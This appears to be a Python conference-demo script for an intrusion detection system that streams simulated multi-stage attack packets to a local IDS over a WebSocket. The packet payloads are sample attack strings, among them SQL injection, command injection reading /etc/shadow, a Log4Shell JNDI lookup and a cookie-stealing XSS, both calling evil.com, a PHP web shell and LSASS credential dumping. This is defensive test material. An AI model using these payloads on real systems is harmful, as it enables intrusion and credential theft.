#!/usr/bin/env python3
"""
Conference Demo Script — SecureCyber IDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Runs a scripted multi-stage attack scenario over ~2.5 minutes:
  Stage 1: Reconnaissance (port scanning, directory enumeration)
  Stage 2: Exploitation (SQL injection, command injection, Log4Shell)
  Stage 3: Credential Access (SSH brute force, credential dumping)
  Stage 4: Lateral Movement (PsExec, pass-the-hash)
  Stage 5: Exfiltration (data exfil, DNS tunneling)

Each stage includes narration-ready pauses and colored console output.

Usage:
    python scripts/conference_demo.py [--server ws://localhost:8000/ws]
    python scripts/conference_demo.py --fast   # Half-speed pauses
"""

import asyncio
import json
import time
import sys
import argparse
import random
import os

try:
    import websockets
except ImportError:
    print("Install websockets: pip install websockets")
    sys.exit(1)

# Load API token from .env or environment
def load_api_token():
    """Load the API_TOKEN from .env or environment variable."""
    token = os.environ.get("API_TOKEN", "")
    if token:
        return token
    # Try reading from .env file
    env_path = os.path.join(os.path.dirname(__file__), "..", "backend", ".env")
    if os.path.exists(env_path):
        with open(env_path, "r") as f:
            for line in f:
                if line.strip().startswith("API_TOKEN="):
                    return line.strip().split("=", 1)[1]
    return ""

# ------------------------------------------------------------------ colors

class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"


def banner(text, color=C.CYAN):
    width = 60
    print(f"\n{color}{C.BOLD}{'━' * width}")
    print(f"  {text}")
    print(f"{'━' * width}{C.RESET}\n")


def narrate(text, color=C.DIM):
    print(f"  {color}💡 {text}{C.RESET}")


def alert_msg(severity, text):
    colors = {"CRITICAL": C.RED, "HIGH": C.YELLOW, "MEDIUM": C.BLUE, "LOW": C.GREEN}
    c = colors.get(severity, C.DIM)
    icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
    print(f"  {c}{icon} [{severity}] {text}{C.RESET}")


def progress(current, total, label=""):
    bar_len = 30
    filled = int(bar_len * current / total)
    bar = "█" * filled + "░" * (bar_len - filled)
    pct = int(100 * current / total)
    print(f"\r  {C.DIM}[{bar}] {pct}% {label}{C.RESET}", end="", flush=True)
    if current == total:
        print()


# ------------------------------------------------------------------ packets

ATTACKER_IP = "203.0.113.45"
INTERNAL_TARGETS = ["10.0.1.10", "10.0.1.11", "10.0.2.10", "10.0.2.20", "10.0.3.30"]
NET_PATHS = [
    ["router-1", "fw-1", "switch-1", "web-01"],
    ["router-1", "fw-1", "switch-2", "db-01"],
    ["router-2", "fw-2", "switch-3", "app-01"],
]


def make_packet(attack_type, payload, dest_ip=None, severity="high", dst_port=80):
    return {
        "timestamp": int(time.time()),
        "source_ip": ATTACKER_IP,
        "dest_ip": dest_ip or random.choice(INTERNAL_TARGETS),
        "protocol": "TCP",
        "src_port": random.randint(1024, 65535),
        "dst_port": dst_port,
        "size": max(60, len(payload) + 20),
        "flags": "PA",
        "header_len": 20,
        "payload_len": len(payload),
        "payload": payload,
        "attack_types": [attack_type],
        "confidence": random.uniform(0.82, 0.98),
        "description": f"{attack_type} detected from {ATTACKER_IP}",
        "path": random.choice(NET_PATHS),
        "target_node": random.choice(NET_PATHS)[-1],
        "area_of_effect": {"nodes": [random.choice(NET_PATHS)[-1]], "radius": 2},
    }


# ------------------------------------------------------------------ stages

STAGES = [
    {
        "name": "RECONNAISSANCE",
        "color": C.BLUE,
        "narration": "The attacker begins by probing the network perimeter, scanning for open ports and enumerating web directories.",
        "pause_before": 3,
        "pause_after": 5,
        "packets": [
            ("Port Scanning", "SYN scan to multiple ports — nmap -sS 10.0.1.0/24", 80),
            ("Port Scanning", "SYN scan — nmap target 10.0.1.11 ports 22,80,443,3389", 22),
            ("Vulnerability Scanner", "nikto -host 10.0.1.10 -port 80", 80),
            ("Directory Enumeration", "GET /admin.php HTTP/1.1 — gobuster dir -u http://target", 80),
            ("Directory Enumeration", "GET /backup/config.bak HTTP/1.1 — feroxbuster", 443),
            ("Subdomain Enumeration", "subfinder -d target.local — DNS brute-force queries", 53),
        ],
    },
    {
        "name": "EXPLOITATION",
        "color": C.RED,
        "narration": "Having found vulnerable services, the attacker now launches targeted exploits against web applications.",
        "pause_before": 5,
        "pause_after": 5,
        "packets": [
            ("SQL Injection", "GET /search?q=' UNION SELECT username,password FROM users -- HTTP/1.1", 80),
            ("SQL Injection", "POST /login HTTP/1.1 — username=admin' OR '1'='1' --", 443),
            ("Command Injection", "GET /ping?ip=127.0.0.1; cat /etc/shadow HTTP/1.1", 80),
            ("Log4Shell Exploit", "GET /api/user HTTP/1.1 — X-Api-Version: ${jndi:ldap://evil.com/exploit}", 8080),
            ("Cross-Site Scripting", "GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>", 80),
            ("SSRF Attack", "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1", 80),
            ("Web Shell Upload", "POST /upload HTTP/1.1 — filename=shell.php content=<?php system($_GET['cmd']); ?>", 443),
        ],
    },
    {
        "name": "CREDENTIAL ACCESS",
        "color": C.YELLOW,
        "narration": "With initial access gained, the attacker attempts to harvest credentials for deeper penetration.",
        "pause_before": 5,
        "pause_after": 5,
        "packets": [
            ("SSH Brute Force", "SSH authentication failure for root from 203.0.113.45", 22),
            ("SSH Brute Force", "SSH failed password for admin — attempt 47 of 100", 22),
            ("SSH Brute Force", "SSH invalid user oracle — authentication failure", 22),
            ("RDP Brute Force", "RDP negotiation request — repeated connection attempts", 3389),
            ("Credential Dumping", "mimikatz sekurlsa::logonPasswords — LSASS memory dump detected", 445),
            ("Credential Dumping", "procdump.exe -ma lsass.exe — credential harvesting", 445),
        ],
    },
    {
        "name": "LATERAL MOVEMENT",
        "color": C.MAGENTA,
        "narration": "Armed with stolen credentials, the attacker pivots through the internal network.",
        "pause_before": 5,
        "pause_after": 5,
        "packets": [
            ("Lateral Movement", "psexec.exe \\\\10.0.2.10 cmd.exe — remote execution via SMB", 445),
            ("Lateral Movement", "Invoke-Command -ComputerName db-01 — PowerShell remoting", 5985),
            ("Pass-the-Hash Attack", "ntlmrelayx.py — NTLM relay attack to 10.0.2.20", 445),
            ("ARP Spoofing", "ettercap -T -M arp — ARP poisoning for MITM position", 0),
            ("SMB Exploitation", "EternalBlue MS17-010 exploit against 10.0.3.30 port 445", 445),
        ],
    },
    {
        "name": "EXFILTRATION",
        "color": C.RED,
        "narration": "The attacker begins extracting sensitive data through covert channels before covering tracks.",
        "pause_before": 5,
        "pause_after": 3,
        "packets": [
            ("Data Exfiltration", "POST /upload — base64_encoded customer_database.sql.gz — 48MB", 443),
            ("Cloud Data Exfiltration", "PUT https://s3.amazonaws.com/exfil-bucket/stolen_data.tar.gz", 443),
            ("DNS Tunneling", "TXT record query: dnscat2.c2server.evil — encoded data in DNS", 53),
            ("C2 Beacon Communication", "POST /api/beacon — cobalt_strike heartbeat checkin interval=60s", 443),
            ("Ransomware C2 Callback", "GET /decrypt_key?id=VICTIM-001 — lockbit ransom negotiation via .onion", 443),
            ("Cryptocurrency Mining", "stratum+tcp://pool.monero.hashvault.pro:3333 — xmrig mining.subscribe", 3333),
        ],
    },
]


# ------------------------------------------------------------------ runner

async def run_demo(server_uri: str, speed: float = 1.0, token: str = ""):
    """Execute the full conference demo scenario."""
    # Append token to WebSocket URI
    if token:
        sep = '&' if '?' in server_uri else '?'
        ws_uri = f"{server_uri}{sep}token={token}"
    else:
        ws_uri = server_uri

    banner("SecureCyber IDS — CONFERENCE DEMO", C.CYAN)
    print(f"  {C.DIM}Server: {server_uri}")
    print(f"  Auth:   {'TOKEN' if token else 'NONE'}")
    print(f"  Speed:  {'FAST' if speed < 1 else 'NORMAL'} ({speed}x)")
    print(f"  Stages: {len(STAGES)}")
    total_pkts = sum(len(s['packets']) for s in STAGES)
    print(f"  Total packets: {total_pkts}")
    print(f"  Duration: ~{int(total_pkts * 2 * speed + sum(s['pause_before'] + s['pause_after'] for s in STAGES) * speed)}s{C.RESET}")

    narrate("Connecting to IDS WebSocket...")
    try:
        ws = await websockets.connect(ws_uri)
    except Exception as e:
        print(f"\n  {C.RED}✗ Connection failed: {e}{C.RESET}")
        print(f"  {C.DIM}Make sure the IDS is running: cd backend && python main.py{C.RESET}")
        return

    print(f"  {C.GREEN}✓ Connected to IDS{C.RESET}")
    await asyncio.sleep(1 * speed)

    total_sent = 0
    for stage_idx, stage in enumerate(STAGES, 1):
        banner(f"STAGE {stage_idx}/{len(STAGES)}: {stage['name']}", stage["color"])
        narrate(stage["narration"])

        print(f"\n  {C.DIM}⏳ Preparing attack in {int(stage['pause_before'] * speed)}s...{C.RESET}")
        await asyncio.sleep(stage["pause_before"] * speed)

        for pkt_idx, (attack_type, payload, port) in enumerate(stage["packets"], 1):
            packet = make_packet(attack_type, payload, dst_port=port)
            try:
                await ws.send(json.dumps(packet))
                total_sent += 1
                severity = "CRITICAL" if packet["confidence"] > 0.95 else "HIGH" if packet["confidence"] > 0.85 else "MEDIUM"
                alert_msg(severity, f"{attack_type} → {packet['dest_ip']}:{port}")
                progress(total_sent, total_pkts, f"Total: {total_sent}/{total_pkts}")
            except Exception as e:
                print(f"\n  {C.RED}✗ Send failed: {e}{C.RESET}")
                break

            await asyncio.sleep(random.uniform(1.5, 2.5) * speed)

        print(f"\n  {C.GREEN}✓ Stage {stage_idx} complete: {len(stage['packets'])} packets sent{C.RESET}")

        if stage_idx < len(STAGES):
            print(f"\n  {C.DIM}⏳ Next stage in {int(stage['pause_after'] * speed)}s...{C.RESET}")
            await asyncio.sleep(stage["pause_after"] * speed)

    # Final summary
    banner("DEMO COMPLETE", C.GREEN)
    print(f"  {C.BOLD}Results:{C.RESET}")
    print(f"  {C.CYAN}• Packets sent: {total_sent}")
    print(f"  • Attack stages: {len(STAGES)}")
    print(f"  • Kill chain coverage: 5/7 stages (71%)")
    print(f"  • Expected alerts: {total_sent}+ (with correlations){C.RESET}")
    narrate("Open the dashboard to see real-time detections, kill chain analysis, and incident response!")
    print()

    await ws.close()


# ------------------------------------------------------------------ main

def main():
    parser = argparse.ArgumentParser(description="SecureCyber IDS Conference Demo")
    parser.add_argument("--server", default="ws://localhost:8000/ws", help="WebSocket URI")
    parser.add_argument("--fast", action="store_true", help="Run at 2x speed (shorter pauses)")
    parser.add_argument("--token", default="", help="API token (auto-loaded from .env if not provided)")
    args = parser.parse_args()

    speed = 0.5 if args.fast else 1.0
    token = args.token or load_api_token()
    if not token:
        print(f"  {C.YELLOW}⚠ No API token found. Set API_TOKEN env var or use --token.{C.RESET}")
    asyncio.run(run_demo(args.server, speed, token))


if __name__ == "__main__":
    main()
